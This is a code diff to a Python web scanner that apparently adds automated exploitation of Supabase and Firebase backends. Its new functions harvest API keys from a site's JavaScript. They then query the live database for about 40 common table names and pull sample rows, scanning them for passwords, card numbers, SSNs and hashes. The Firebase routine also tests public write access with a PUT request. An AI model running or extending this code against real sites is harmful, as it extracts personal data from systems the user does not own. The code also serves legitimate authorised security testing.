@@ -1,7 +1,7 @@
 import re
 import json
 import base64
-from typing import Dict, List, Optional, Set, Tuple
+from typing import Dict, List, Optional, Set, Tuple, Any
 from dataclasses import dataclass, field
 from urllib.parse import urlparse, urljoin
 
@@ -71,6 +71,47 @@ class DOMSink:
 
 
 @dataclass
+class BaaSCredential:
+    provider: str
+    project_url: str
+    api_key: str
+    source_file: str
+    line_number: int
+    validated: bool = False
+    accessible_tables: List[str] = field(default_factory=list)
+    sensitive_data: List[str] = field(default_factory=list)
+    severity: str = "CRITICAL"
+    exploitation_log: List[str] = field(default_factory=list)
+    extracted_data: Dict[str, Any] = field(default_factory=dict)
+    
+    def to_dict(self) -> dict:
+        return {
+            "provider": self.provider,
+            "project_url": self.project_url,
+            "api_key": self.api_key[:20] + "..." if len(self.api_key) > 20 else self.api_key,
+            "source_file": self.source_file,
+            "line_number": self.line_number,
+            "validated": self.validated,
+            "accessible_tables": self.accessible_tables,
+            "sensitive_data_types": self.sensitive_data,
+            "severity": self.severity,
+            "exploitation_log": self.exploitation_log,
+            "extracted_data": self._sanitize_extracted_data(),
+        }
+    
+    def _sanitize_extracted_data(self) -> dict:
+        sanitized = {}
+        for table, data in self.extracted_data.items():
+            sanitized[table] = {
+                "row_count": data.get("row_count", 0),
+                "columns": data.get("columns", []),
+                "sensitive_fields": data.get("sensitive_fields", []),
+                "sensitive_values": data.get("sensitive_values", [])[:10],
+            }
+        return sanitized
+
+
+@dataclass
 class JSAnalysisResult:
     scripts_analyzed: int
     endpoints: List[Endpoint]
@@ -79,6 +120,7 @@ class JSAnalysisResult:
     source_maps: List[str]
     frameworks_detected: List[str]
     interesting_strings: List[str]
+    baas_credentials: List[BaaSCredential] = field(default_factory=list)
     
     def to_dict(self) -> dict:
         return {
@@ -89,6 +131,7 @@ class JSAnalysisResult:
             "source_maps": self.source_maps,
             "frameworks_detected": self.frameworks_detected,
             "interesting_strings": self.interesting_strings[:50],
+            "baas_credentials": [b.to_dict() for b in self.baas_credentials],
         }
 
 
@@ -137,7 +180,43 @@ SECRET_PATTERNS = [
     (r'-----BEGIN CERTIFICATE-----', "Certificate", "MEDIUM"),
     (r'firebase[\'"`]?\s*[:=]\s*\{[^}]*apiKey[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]', "Firebase API Key", "HIGH"),
     (r'(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})', "JWT Token", "HIGH"),
+    (r'https://([a-zA-Z0-9_-]+)\.supabase\.co', "Supabase Project URL", "HIGH"),
+    (r'[\'"`](eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)[\'"`]', "Supabase JWT Key", "CRITICAL"),
+    (r'supabaseUrl[\'"`]?\s*[:=]\s*[\'"`](https://[^\'"`]+\.supabase\.co)[\'"`]', "Supabase URL Config", "CRITICAL"),
+    (r'supabaseKey[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]{30,})[\'"`]', "Supabase Anon Key", "CRITICAL"),
+    (r'SUPABASE_URL[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]', "Supabase URL Env", "CRITICAL"),
+    (r'SUPABASE_KEY[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]', "Supabase Key Env", "CRITICAL"),
+    (r'SUPABASE_ANON_KEY[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]', "Supabase Anon Key Env", "CRITICAL"),
+    (r'createClient\s*\(\s*[\'"`](https://[^\'"`]+\.supabase\.co)[\'"`]', "Supabase Client Init", "CRITICAL"),
+    (r'[\'"`](https://[a-zA-Z0-9_-]+\.firebaseio\.com)[\'"`]', "Firebase Realtime DB", "HIGH"),
+    (r'[\'"`](https://firestore\.googleapis\.com[^\'"`]*)[\'"`]', "Firestore URL", "HIGH"),
+    (r'storageBucket[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+\.appspot\.com)[\'"`]', "Firebase Storage", "HIGH"),
+    (r'appId[\'"`]?\s*[:=]\s*[\'"`](1:[0-9]+:[a-z]+:[a-f0-9]+)[\'"`]', "Firebase App ID", "MEDIUM"),
+    (r'messagingSenderId[\'"`]?\s*[:=]\s*[\'"`]([0-9]+)[\'"`]', "Firebase Sender ID", "LOW"),
+    (r'[\'"`](https://[a-zA-Z0-9_-]+\.amplifyapp\.com)[\'"`]', "AWS Amplify URL", "MEDIUM"),
+    (r'aws_appsync_graphqlEndpoint[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]', "AppSync GraphQL", "HIGH"),
+    (r'aws_user_pools_id[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]', "Cognito Pool ID", "HIGH"),
 ]
+
+BAAS_PATTERNS = {
+    "supabase": {
+        "url": r'https://([a-zA-Z0-9_-]+)\.supabase\.co',
+        "key": r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
+        "config": r'createClient\s*\([^)]+\)',
+    },
+    "firebase": {
+        "url": r'https://([a-zA-Z0-9_-]+)\.firebaseio\.com',
+        "config": r'firebase\.initializeApp\s*\(\s*\{[^}]+\}',
+        "apikey": r'apiKey[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]',
+    },
+    "appwrite": {
+        "url": r'https://[a-zA-Z0-9_.-]+/v1',
+        "project": r'setProject\s*\([\'"`]([^\'"`]+)[\'"`]\)',
+    },
+    "pocketbase": {
+        "url": r'new PocketBase\s*\([\'"`]([^\'"`]+)[\'"`]\)',
+    },
+}
 
 DOM_SINKS = [
     (r'\.innerHTML\s*=\s*([^;]+)', "innerHTML", "HIGH"),
@@ -183,15 +262,261 @@ DOM_SOURCES = [
 ]
 
 
+SENSITIVE_FIELD_PATTERNS = [
+    r'password', r'passwd', r'pwd', r'secret',
+    r'token', r'api_key', r'apikey', r'auth',
+    r'credit_card', r'card_number', r'cvv', r'ccv',
+    r'ssn', r'social_security', r'tax_id',
+    r'email', r'phone', r'address', r'dob', r'birth',
+    r'salary', r'income', r'bank', r'account',
+    r'private', r'confidential', r'sensitive',
+]
+
+SENSITIVE_VALUE_PATTERNS = {
+    "jwt": r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
+    "credit_card": r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b',
+    "ssn": r'\b\d{3}-\d{2}-\d{4}\b',
+    "email": r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
+    "phone": r'\+?1?[-.\s]?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',
+    "bcrypt_hash": r'\$2[aby]?\$\d{1,2}\$[./A-Za-z0-9]{53}',
+    "md5_hash": r'\b[a-f0-9]{32}\b',
+    "sha256_hash": r'\b[a-f0-9]{64}\b',
+    "aws_key": r'AKIA[0-9A-Z]{16}',
+    "private_key": r'-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----',
+}
+
+
 class JSAnalyzer:
     def __init__(self):
         self._scripts_cache = {}
         self._results_cache = {}
     
+    def _extract_baas_credentials(self, content: str, source_file: str) -> List[BaaSCredential]:
+        credentials = []
+        
+        supabase_urls = re.findall(r'https://([a-zA-Z0-9_-]+)\.supabase\.co', content)
+        supabase_keys = re.findall(r'eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}', content)
+        
+        if supabase_urls and supabase_keys:
+            for url_match in set(supabase_urls):
+                for key in set(supabase_keys):
+                    line_num = content[:content.find(url_match)].count('\n') + 1
+                    credentials.append(BaaSCredential(
+                        provider="supabase",
+                        project_url=f"https://{url_match}.supabase.co",
+                        api_key=key,
+                        source_file=source_file,
+                        line_number=line_num,
+                    ))
+        
+        firebase_configs = re.finditer(
+            r'apiKey[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`][^}]*'
+            r'authDomain[\'"`]?\s*[:=]\s*[\'"`]([^\'"`]+)[\'"`]',
+            content, re.DOTALL
+        )
+        for match in firebase_configs:
+            api_key = match.group(1)
+            auth_domain = match.group(2)
+            if 'firebaseapp.com' in auth_domain:
+                line_num = content[:match.start()].count('\n') + 1
+                credentials.append(BaaSCredential(
+                    provider="firebase",
+                    project_url=f"https://{auth_domain}",
+                    api_key=api_key,
+                    source_file=source_file,
+                    line_number=line_num,
+                ))
+        
+        return credentials
+    
+    async def _validate_baas_credential(self, http_client, cred: BaaSCredential) -> BaaSCredential:
+        if cred.provider == "supabase":
+            cred = await self._exploit_supabase(http_client, cred)
+        elif cred.provider == "firebase":
+            cred = await self._exploit_firebase(http_client, cred)
+        return cred
+    
+    async def _exploit_supabase(self, http_client, cred: BaaSCredential) -> BaaSCredential:
+        exploitation_log = []
+        extracted_data = {}
+        
+        try:
+            headers = {
+                "apikey": cred.api_key,
+                "Authorization": f"Bearer {cred.api_key}",
+                "Content-Type": "application/json",
+                "Prefer": "return=representation",
+            }
+            
+            exploitation_log.append("[*] Testing Supabase REST API access...")
+            rest_url = f"{cred.project_url}/rest/v1/"
+            resp = await http_client.get(rest_url, headers=headers)
+            
+            if resp.get("status") != 200:
+                exploitation_log.append(f"[-] Initial access failed: {resp.get('status')}")
+                cred.exploitation_log = exploitation_log
+                return cred
+            
+            cred.validated = True
+            exploitation_log.append("[+] REST API accessible!")
+            
+            exploitation_log.append("[*] Enumerating tables via OpenAPI schema...")
+            schema_resp = await http_client.get(f"{rest_url}", headers=headers)
+            
+            common_tables = [
+                "users", "accounts", "profiles", "customers", "members",
+                "auth", "sessions", "tokens", "credentials", "passwords",
+                "orders", "payments", "transactions", "invoices", "billing",
+                "products", "items", "inventory", "catalog",
+                "messages", "emails", "notifications", "logs",
+                "settings", "config", "preferences", "options",
+                "files", "uploads", "documents", "attachments",
+                "comments", "posts", "articles", "content",
+                "admin", "staff", "employees", "roles", "permissions",
+            ]
+            
+            exploitation_log.append(f"[*] Probing {len(common_tables)} common table names...")
+            
+            for table in common_tables:
+                try:
+                    table_url = f"{rest_url}{table}?select=*&limit=10"
+                    table_resp = await http_client.get(table_url, headers=headers)
+                    
+                    if table_resp.get("status") == 200:
+                        text = table_resp.get("text", "")
+                        if text and text.strip() not in ["[]", ""]:
+                            try:
+                                data = json.loads(text)
+                                if isinstance(data, list) and len(data) > 0:
+                                    cred.accessible_tables.append(table)
+                                    row_count = len(data)
+                                    columns = list(data[0].keys()) if data else []
+                                    
+                                    exploitation_log.append(f"[+] TABLE FOUND: {table} ({row_count} rows, {len(columns)} columns)")
+                                    exploitation_log.append(f"    Columns: {', '.join(columns[:10])}")
+                                    
+                                    extracted_data[table] = {
+                                        "row_count": row_count,
+                                        "columns": columns,
+                                        "sample_data": data[:3],
+                                        "sensitive_fields": [],
+                                        "sensitive_values": [],
+                                    }
+                                    
+                                    for col in columns:
+                                        for pattern in SENSITIVE_FIELD_PATTERNS:
+                                            if re.search(pattern, col, re.IGNORECASE):
+                                                extracted_data[table]["sensitive_fields"].append(col)
+                                                cred.sensitive_data.append(f"{table}.{col}")
+                                                exploitation_log.append(f"    [!] SENSITIVE COLUMN: {col}")
+                                    
+                                    for row in data:
+                                        for col, value in row.items():
+                                            if value and isinstance(value, str):
+                                                for vuln_type, pattern in SENSITIVE_VALUE_PATTERNS.items():
+                                                    if re.search(pattern, str(value)):
+                                                        extracted_data[table]["sensitive_values"].append({
+                                                            "column": col,
+                                                            "type": vuln_type,
+                                                            "value": str(value)[:50] + "..." if len(str(value)) > 50 else str(value),
+                                                        })
+                                                        exploitation_log.append(f"    [!!!] {vuln_type.upper()} FOUND in {col}")
+                            except json.JSONDecodeError:
+                                pass
+                except Exception:
+                    pass
+            
+            if cred.accessible_tables:
+                exploitation_log.append(f"\n[+] EXPLOITATION SUCCESSFUL!")
+                exploitation_log.append(f"[+] Total tables accessible: {len(cred.accessible_tables)}")
+                exploitation_log.append(f"[+] Sensitive fields found: {len(cred.sensitive_data)}")
+                
+                total_sensitive_values = sum(len(t.get("sensitive_values", [])) for t in extracted_data.values())
+                if total_sensitive_values > 0:
+                    exploitation_log.append(f"[!!!] SENSITIVE DATA EXTRACTED: {total_sensitive_values} items")
+                    cred.severity = "CRITICAL"
+            else:
+                exploitation_log.append("[-] No accessible tables found (RLS may be enabled)")
+                exploitation_log.append("[*] Trying alternative approaches...")
+                
+                rpc_url = f"{cred.project_url}/rest/v1/rpc/"
+                rpc_resp = await http_client.get(rpc_url, headers=headers)
+                if rpc_resp.get("status") == 200:
+                    exploitation_log.append("[+] RPC endpoint accessible - stored procedures may be callable")
+                
+                storage_url = f"{cred.project_url}/storage/v1/bucket"
+                storage_resp = await http_client.get(storage_url, headers=headers)
+                if storage_resp.get("status") == 200:
+                    exploitation_log.append("[+] Storage API accessible - files may be downloadable")
+            
+            cred.exploitation_log = exploitation_log
+            cred.extracted_data = extracted_data
+            
+        except Exception as e:
+            exploitation_log.append(f"[-] Exploitation error: {str(e)}")
+            cred.exploitation_log = exploitation_log
+        
+        return cred
+    
+    async def _exploit_firebase(self, http_client, cred: BaaSCredential) -> BaaSCredential:
+        exploitation_log = []
+        
+        try:
+            exploitation_log.append("[*] Testing Firebase Realtime Database access...")
+            
+            db_url = cred.project_url.replace("firebaseapp.com", "firebaseio.com")
+            if not db_url.endswith(".firebaseio.com"):
+                project_id = cred.project_url.split(".")[0].replace("https://", "")
+                db_url = f"https://{project_id}.firebaseio.com"
+            
+            test_url = f"{db_url}/.json"
+            resp = await http_client.get(test_url)
+            
+            if resp.get("status") == 200:
+                text = resp.get("text", "")
+                if text and text != "null":
+                    cred.validated = True
+                    exploitation_log.append("[+] Firebase database is PUBLICLY READABLE!")
+                    cred.severity = "CRITICAL"
+                    
+                    try:
+                        data = json.loads(text)
+                        if isinstance(data, dict):
+                            cred.accessible_tables = list(data.keys())[:20]
+                            exploitation_log.append(f"[+] Root collections: {', '.join(cred.accessible_tables)}")
+                            
+                            for key in cred.accessible_tables:
+                                for pattern in SENSITIVE_FIELD_PATTERNS:
+                                    if re.search(pattern, key, re.IGNORECASE):
+                                        cred.sensitive_data.append(key)
+                                        exploitation_log.append(f"[!] SENSITIVE COLLECTION: {key}")
+                    except:
+                        pass
+            else:
+                exploitation_log.append(f"[-] Database access denied: {resp.get('status')}")
+            
+            exploitation_log.append("[*] Testing Firebase write access...")
+            write_resp = await http_client.request(
+                "PUT",
+                f"{db_url}/lantern_test.json",
+                json={"test": "probe"},
+            )
+            if write_resp.get("status") == 200:
+                exploitation_log.append("[!!!] Firebase database is PUBLICLY WRITABLE!")
+                cred.severity = "CRITICAL"
+                await http_client.request("DELETE", f"{db_url}/lantern_test.json")
+            
+        except Exception as e:
+            exploitation_log.append(f"[-] Error: {str(e)}")
+        
+        cred.exploitation_log = exploitation_log
+        return cred
+    
     async def analyze_url(self, http_client, url: str) -> JSAnalysisResult:
         all_endpoints = []
         all_secrets = []
         all_sinks = []
+        all_baas_creds = []
         source_maps = []
         frameworks = set()
         interesting = []
@@ -199,10 +524,13 @@ class JSAnalyzer:
         
         response = await http_client.get(url)
         if response.get("error"):
-            return JSAnalysisResult(0, [], [], [], [], [], [])
+            return JSAnalysisResult(0, [], [], [], [], [], [], [])
         
         html = response.get("text", "")
         base_url = url
+        
+        baas_creds = self._extract_baas_credentials(html, f"{url}#html")
+        all_baas_creds.extend(baas_creds)
         
         inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)
         for i, script in enumerate(inline_scripts):
@@ -211,6 +539,7 @@ class JSAnalyzer:
                 all_endpoints.extend(result.endpoints)
                 all_secrets.extend(result.secrets)
                 all_sinks.extend(result.dom_sinks)
+                all_baas_creds.extend(result.baas_credentials)
                 frameworks.update(result.frameworks_detected)
                 interesting.extend(result.interesting_strings)
                 scripts_count += 1
@@ -238,9 +567,19 @@ class JSAnalyzer:
             all_endpoints.extend(result.endpoints)
             all_secrets.extend(result.secrets)
             all_sinks.extend(result.dom_sinks)
+            all_baas_creds.extend(result.baas_credentials)
             frameworks.update(result.frameworks_detected)
             interesting.extend(result.interesting_strings)
             scripts_count += 1
+        
+        validated_creds = []
+        seen_creds = set()
+        for cred in all_baas_creds:
+            key = (cred.provider, cred.project_url, cred.api_key)
+            if key not in seen_creds:
+                seen_creds.add(key)
+                validated = await self._validate_baas_credential(http_client, cred)
+                validated_creds.append(validated)
         
         unique_endpoints = self._deduplicate_endpoints(all_endpoints)
         unique_secrets = self._deduplicate_secrets(all_secrets)
@@ -253,6 +592,7 @@ class JSAnalyzer:
             source_maps=source_maps,
             frameworks_detected=list(frameworks),
             interesting_strings=list(set(interesting))[:100],
+            baas_credentials=validated_creds,
         )
     
     def analyze_script(self, content: str, source_file: str, base_url: str = "") -> JSAnalysisResult:
@@ -261,6 +601,7 @@ class JSAnalyzer:
         sinks = self._find_dom_sinks(content, source_file)
         frameworks = self._detect_frameworks(content)
         interesting = self._find_interesting_strings(content)
+        baas_creds = self._extract_baas_credentials(content, source_file)
         
         return JSAnalysisResult(
             scripts_analyzed=1,
@@ -270,6 +611,7 @@ class JSAnalyzer:
             source_maps=[],
             frameworks_detected=frameworks,
             interesting_strings=interesting,
+            baas_credentials=baas_creds,
         )
     
     def _find_endpoints(self, content: str, source_file: str, base_url: str) -> List[Endpoint]:
